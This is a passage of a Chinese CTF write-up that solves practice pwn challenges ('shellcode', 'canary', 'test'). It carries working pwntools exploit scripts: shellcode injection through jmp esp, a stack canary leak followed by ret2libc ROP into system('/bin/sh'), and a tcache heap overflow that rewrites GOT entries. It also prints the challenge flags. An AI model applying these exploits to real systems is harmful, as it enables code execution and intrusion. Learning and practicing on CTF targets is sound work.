class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">got_addr = puts_addr - puts_offset</span><br><span class="line">system_addr = got_addr + system_offset</span><br><span class="line">str_bin_sh_addr = got_addr + str_bin_sh</span><br><span class="line">log.success(<span class="string">&#x27;Get system address: &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">conn.sendline(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x58</span>+<span class="number">4</span>) + p32(system_addr) + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(str_bin_sh_addr))</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><h1 id="shellcode-100"><a href="#shellcode-100" class="headerlink" title="shellcode(100)"></a>shellcode(100)</h1><p>这道题目中没有可以泄漏地址的地方，但是没有设置 NX，所以可以把 shellcode 写入栈上，但是由于开了 ASLR，所以就需要利用 jmp esp 使控制流转向栈上的 shellcode。通过 ROPgadget 搜索到程序中 jmp esp 指令的地址为 0x08048667，所以构造 payload 为<code>&#39;a&#39;*(0x1c+4) + p32(jmp_esp) + shellcode</code>，其中 0x1c+4 个 a 为栈上的填充字节，后面加上 jmp esp 的地址，后面再加上 shellcode 即可。最终的 exp 如下，获取到 flag 为<code>ctf&#123;1-10w_d0_Jou_kn0w_sh311c0de&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">    HOST = <span class="string">&#x27;campus1.blue-whale.me&#x27;</span></span><br><span class="line">PORT = <span class="number">9992</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(argv) &gt; <span class="number">1</span>:</span><br><span class="line">   conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   conn = process(elf.path)</span><br><span class="line"></span><br><span class="line">jmp_esp = <span class="number">0x08048667</span></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line">conn.sendlineafter(<span class="string">&#x27;input your name\n&#x27;</span>, <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x1c</span>+<span class="number">4</span>) + p32(jmp_esp) + shellcode)</span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="canary-200"><a href="#canary-200" class="headerlink" title="canary(200)"></a>canary(200)</h1><p>这个题相当坑，首先题目是 64 位的，但是给的 libc 的文件中并没有 64 位的 libc，所以得自己通过泄漏的地址搜索 libc，另外如果通过 system 函数 getshell，这个版本的 libc 还有字节对齐的问题。</p><p>首先通过 checksec 发现此题开启了 NX，所以 shellcode 没地方写了，还开了 cannary，所以首先我们就需要想办法弄到这个 canary。题目所有的源码都在 main 函数中，而该程序主要有以下几个功能：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">welcome to buy watermelon system</span><br><span class="line">you can buy watermelon here</span><br><span class="line">1. buy a watermelon</span><br><span class="line">2. get a invoice</span><br><span class="line">3. exchange money</span><br><span class="line">4. exit</span><br></pre></td></tr></table></figure><p>主要的溢出点在第二个功能 get a invoice 上，这里首先会让你输入一个数字，而这个数字就是之后要读取的字符串长度。给的 buf 只有 256 个字节，所以我们就可以输入远超于 256 个字节的长度，就可以溢出到 buf 后面。首先需要想办法泄漏 cannary，大概原理就是 cannary 的最后一个字节总是<code>\x00</code>，所以我们就可以溢出到 cannary 最后一个字节，覆盖掉<code>\x00</code>，这样再 puts 的时候就会把 canary 的值也给带出来，通过下图可以看到 cannary 的位置在 rbp-0x40。</p><p><img src="/2020/10/16/BlueWhaleOJ-Pwn-WriteUp-Part1/4.png"></p><p>所以我们的 paylaod 长度为 <code>0x148-0x48+0x8</code> 再加上最后的 <code>\n</code> 就刚好可以覆盖到 cannary</p><p><img src="/2020/10/16/BlueWhaleOJ-Pwn-WriteUp-Part1/5.png"></p><p>可以看到已经拿到了 canary，在拿到 canary 以后我们就可以覆盖 rip 控制程序执行流程了。由于题目没有给 64 位的 libc，所以我们需要自己泄漏出一个地址来找到 libc 的版本，payload 的构成<code>payload + p64(canary) + gen.get(8*7) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(run_addr)</code></p><p>首先是 cannary 之前要填充的垃圾字符，后面加上 cannary，后面 56 个字节的垃圾字符是为了填充部分寄存器，如下所示，在 ret 之前还会将栈上的一些数据放入寄存器中</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040086E                 add     rsp, 118h</span><br><span class="line">.text:0000000000400875                 pop     rbx</span><br><span class="line">.text:0000000000400876                 pop     rbp</span><br><span class="line">.text:0000000000400877                 pop     r12</span><br><span class="line">.text:0000000000400879                 pop     r13</span><br><span class="line">.text:000000000040087B                 pop     r14</span><br><span class="line">.text:000000000040087D                 pop     r15</span><br><span class="line">.text:000000000040087F                 retn</span><br></pre></td></tr></table></figure><p>后面是一个 gadget<code>pop rdi</code>以及<code>ret</code>，64 位的第一个参数是通过 rdi 传递的，后面加上想要泄漏的 got 地址，也就是 puts 函数的参数，再加上 puts 函数的地址，就可以泄漏出 puts 函数在运行时的真实地址了，由于 payload 会在 main 函数结束时触发，为了不使程序结束，所以需要在最后再加上一个返回地址，这里选择了 main 函数的地址。再拿到 puts 函数的真实地址以后就可以找到对应的 libc 为<code>libc6_2.27-3ubuntu1.2_amd64.so</code>。</p><p>获取 libc 以后就可以计算出 got 表的基址，然后算出 system 函数以及其参数 <code>/bin/sh</code> 的地址，之后的方法同上，但是这里的 system 有一个小坑，就是必须 16 字节对齐，所以就需要在调用 system 之前调用一次 ret，使栈以 16 字节对齐，详情请参考 <a href="http://homura.cc/blog/archives/168"> 关于 libc-2.27 中 system 函数的一个坑</a>。exp 如下，最后拿到 flag 为<code>ctf&#123;st4ck_C4n41y_1s_not_secure&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">    HOST = <span class="string">&#x27;campus1.blue-whale.me&#x27;</span></span><br><span class="line">PORT = <span class="number">9993</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    conn = process(elf.path, env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">overflow</span>(<span class="params">payload</span>):</span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;------\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;input name length\n&#x27;</span>, <span class="string">&#x27;999&#x27;</span>)</span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;999&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">gen = cyclic_gen()</span><br><span class="line">payload = gen.get(<span class="number">0x148</span>-<span class="number">0x48</span>+<span class="number">0x8</span>)</span><br><span class="line">overflow(payload)</span><br><span class="line">conn.recvuntil(payload)</span><br><span class="line">canary = u64(conn.recv(<span class="number">8</span>)) - <span class="number">0xa</span></span><br><span class="line">log.success(<span class="string">&#x27;Get cannary: &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">run_addr = <span class="number">0x400650</span></span><br><span class="line">ret_addr = <span class="number">0x4005b9</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x40087e</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    overflow(payload + p64(canary) + gen.get(<span class="number">8</span>*<span class="number">7</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(run_addr))</span><br><span class="line"><span class="comment"># Tigger the paylaod.</span></span><br><span class="line">conn.sendlineafter(<span class="string">&#x27;------\n&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = conn.recv(<span class="number">6</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(s) &lt; <span class="number">8</span>:</span><br><span class="line">   s += <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">puts_addr = u64(s)</span><br><span class="line">log.success(<span class="string">&#x27;Get puts address: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">puts_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">got_addr = puts_addr - puts_offset </span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">system_addr = got_addr + system_offset</span><br><span class="line">str_bin_sh = got_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;Get system address:&#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">overflow(payload + p64(canary) + gen.get(<span class="number">8</span>*<span class="number">7</span>) + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(ret_addr) + p64(system_addr))</span><br><span class="line">conn.sendlineafter(<span class="string">&#x27;------\n&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><h1 id="test-200"><a href="#test-200" class="headerlink" title="test(200)"></a>test(200)</h1><p>这道题实现了一个简单的笔记功能，可以新增笔记，修改笔记与删除笔记。所有的笔记被放在一个全局变量指针数组 <code>char* node[100]</code> 中，并且笔记的数量由全局变量 count 管理，count 不能大于 99，每新增一篇笔记 count+1 并且 count 会作为笔记的 id 在删除或修改笔记时使用。新增的笔记放在 malloc 分配的堆中，一篇笔记长度为 48 字节，如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">newnote</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">99</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;why you have so many notes&quot;</span>);</span><br><span class="line">  v0 = count;</span><br><span class="line">  notes[v0] = <span class="built_in">malloc</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input note&quot;</span>);</span><br><span class="line">  input(notes[count], <span class="number">0x30</span>);</span><br><span class="line">  <span class="keyword">return</span> count++ + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc 分配完成后由 input 函数负责读取输入并写入 note 中，最大写入 48 个字节。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">input</span><span class="params">(<span class="type">char</span> *note, <span class="type">int</span> length)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length &amp;&amp; read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>) &gt;= <span class="number">0</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    note[i] = buf;</span><br><span class="line">    <span class="keyword">if</span> (buf == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      note[i] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新增笔记这一块是没有什么漏洞的，再看删除笔记。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">deletenote</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input id you want to delete&quot;</span>);</span><br><span class="line">  v1 = ret_num();</span><br><span class="line">  <span class="keyword">if</span> (v1 &gt; <span class="number">99</span> || v1 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;wrong id range&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!notes[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;There isn&#x27;t a note yet&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(notes[v1]);</span><br><span class="line">  result = v1;</span><br><span class="line">  notes[v1] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 ret_num 函数读取用户输入并且将字符串转为数字，读取用户输入的笔记 ID 以后再去 free 这个笔记，并且在 free 之后又将该笔记的指针赋为空指针。再看编辑笔记。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">editnote</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input id you want to edit&quot;</span>);</span><br><span class="line">  v1 = ret_num();</span><br><span class="line">  <span class="keyword">if</span> (v1 &gt; <span class="number">99</span> || v1 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;wrong id range&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (notes[v1] )</span><br><span class="line">    <span class="keyword">return</span> input(notes[v1], <span class="number">80</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You havn&#x27;t even new it yet&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在新增笔记中一篇笔记最大长度为 48 字节，而这里修改笔记的时候最大长度就变成了 80 字节，所以这里存在一个堆溢出。最后再看 ret_num，该函数最多只读 10 个字节，所以该函数返回的最大值为 9999999999，最小值为 -99999999</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ret_num</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *nptr = <span class="number">0LL</span>;</span><br><span class="line">  *&amp;nptr[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">  input(nptr, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> atoi(nptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以整个程序的逻辑就是通过 new_note 来 malloc，通过 edit_note 进行溢出，通过 delete_note 来 free，是一个很基本的堆溢出题目。题目中所有申请的堆都是 0x30 个字节，因此此题可以利用 tcache 攻击，而最后的目的就是修改 got 表泄漏 libc 的地址，然后调用 libc 中的 system 来 getshell。</p><p>通过堆溢出可以很容易的控制 tcache 中的 fd 做到任意地址写，而题目中又提供了一个全局的指针数组 notes，所以我们可以把想要修改的 got 表的地址写入 notes 中，通过 edit_note 就可以直接向 got 表中写入任意的地址。首先要做的就是想办法泄漏出一个 libc 的地址，在 delete_note 中有一行 <code>free(notes[v1]);</code>，如果把 free 修改为 puts 的话就可以直接打印出 notes[v1] 中的指针也就是地址了</p><p>拿到 libc 的地址以后就可以很容易计算出 system 的地址了，在 ret_num 函数中有一行 <code>atoi(nptr);</code>，而这个 nptr 刚好是我们可以控制的字符串，因此可以把 atoi 的 got 地址修改为 system 函数的地址，然后发送<code>/bin/sh</code> 就可以 getshell。</p><p>所以总流程为：首先将 free@got，puts@got 以及 atoi@got 的地址写入 notes 中方便修改，第二步通过编辑 note[0]修改 free@got 的地址为 put@plt 的地址，第三步调用 delete_note 中的 free 从而打印出 notes[1]中 puts@got 的地址，泄漏出 libc 的地址以后计算出 system 的地址，最后一步编辑 note[2]将 atoi@got 的地址修改为 system 函数的地址，再发送 <code>/bin/sh</code> 就可以拿到 shell。最后的 exp 如下，拿到 flag<code>ctf&#123;Y0u_k0wn_f4s1bin_____&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">    HOST = <span class="string">&#x27;campus1.blue-whale.me&#x27;</span></span><br><span class="line">PORT = <span class="number">9995</span></span><br><span class="line"></span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.update(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;) </span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6_2.27-3ubuntu1.3_amd64.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">pg = cyclic_gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line">    <span class="keyword">global</span> count</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_note</span>(<span class="params">payload=<span class="string">&#x27;A&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">global</span> count</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;1. new note\n2. delete note\n3. edit note\n4. exit\n\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;input note\n&#x27;</span>, payload)</span><br><span class="line">    n = count - <span class="number">1</span></span><br><span class="line">    log.info(<span class="string">&#x27;Malloc note: &#x27;</span> + <span class="built_in">str</span>(n))</span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">delete_note</span>(<span class="params">n</span>):</span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;1. new note\n2. delete note\n3. edit note\n4. exit\n\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;input id you want to delete\n&#x27;</span>, <span class="built_in">str</span>(n))</span><br><span class="line">    log.info(<span class="string">&#x27;Free note: &#x27;</span> + <span class="built_in">str</span>(n))</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">edit_note</span>(<span class="params">n, payload</span>):</span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;1. new note\n2. delete note\n3. edit note\n4. exit\n\n&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;input id you want to edit\n&#x27;</span>, <span class="built_in">str</span>(n))</span><br><span class="line">    conn.sendline(payload)</span><br><span class="line">    log.info(<span class="string">&#x27;Overflow note:&#x27;</span> + <span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x400620: free@plt</span></span><br><span class="line"><span class="string">0x400630: puts@plt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x602018 R_X86_64_JUMP_SLOT  free@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">0x602020 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">libc6_2.27-3ubuntu1.3_amd64</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">note_addr = <span class="number">0x00000000006020C0</span></span><br><span class="line"></span><br><span class="line">new_note()  <span class="comment"># notes[0], heap[1].</span></span><br><span class="line">new_note()  <span class="comment"># notes[1], heap[2].</span></span><br><span class="line">new_note()  <span class="comment"># notes[2], heap[3].</span></span><br><span class="line">new_note()  <span class="comment"># notes[3], heap[4].</span></span><br><span class="line">new_note()  <span class="comment"># notes[4], heap[5].</span></span><br><span class="line">note1 = new_note()  <span class="comment"># notes[5], heap[6].</span></span><br><span class="line">note2 = new_note()  <span class="comment"># notes[6], heap[7].</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Tcache count + 3</span></span><br><span class="line">tmp1 = new_note()  <span class="comment"># notes[7], heap[8].</span></span><br><span class="line">tmp2 = new_note()  <span class="comment"># notes[8], heap[9].</span></span><br><span class="line">tmp3 = new_note()  <span class="comment"># notes[9], heap[10].</span></span><br><span class="line">delete_note(tmp1)</span><br><span class="line">delete_note(tmp2)</span><br><span class="line">delete_note(tmp3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Overflow.</span></span><br><span class="line">delete_note(note2)</span><br><span class="line"><span class="comment"># 